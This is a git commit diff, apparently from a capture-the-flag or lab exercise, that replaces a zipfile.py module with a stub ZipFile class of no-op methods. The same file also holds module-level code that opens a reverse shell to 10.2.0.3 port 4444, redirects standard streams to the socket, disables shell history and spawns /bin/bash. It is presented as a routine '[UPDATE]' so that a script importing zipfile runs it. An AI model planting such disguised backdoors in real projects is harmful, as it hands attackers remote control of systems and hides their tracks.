cf7ebb88a3568fba9a204dbe2e749c6daa626d0d
Théa Gory--Lauret <thea.gory-lauret@epitech.eu>
2024-04-05 00:22:54 +0400

    [UPDATE] zipfile for backup.py

--- zipfile.py
+++ zipfile.py
@@ -1,3 +1,27 @@
 import os
+import pty
+import socket
 
-os.system('chown cave-of-miracles.cave-of-miracles')
+lhost = "10.2.0.3"
+lport = 4444
+
+ZIP_DEFLATED = 0
+
+class ZipFile:
+    def close(*args):
+        return
+
+    def write(*args):
+        return
+
+    def __init__(self, *args):
+        return
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((lhost, lport))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+os.putenv("HISTFILE",'/dev/null')
+pty.spawn("/bin/bash")
+s.close()
